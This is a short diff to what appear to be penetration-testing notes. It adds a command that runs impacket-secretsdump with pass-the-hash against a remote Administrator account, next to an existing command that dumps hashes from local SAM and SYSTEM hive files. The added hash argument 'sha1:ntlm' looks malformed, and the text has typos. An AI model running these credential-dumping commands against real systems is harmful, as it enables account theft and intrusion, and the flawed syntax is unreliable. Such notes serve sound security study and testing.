@@ -22,6 +22,10 @@ Then run impacket secertdumps:
 ```
 impacket-secretsdump -sam sam -system system LOCAL
 ```
+Dumping with hashes after using mkmikatz:
+```
+impacket-secretsdump WORKGROUP/Administrator@$target -hashes sha1:ntlm
+```
 
 ## Mimikatz:
 
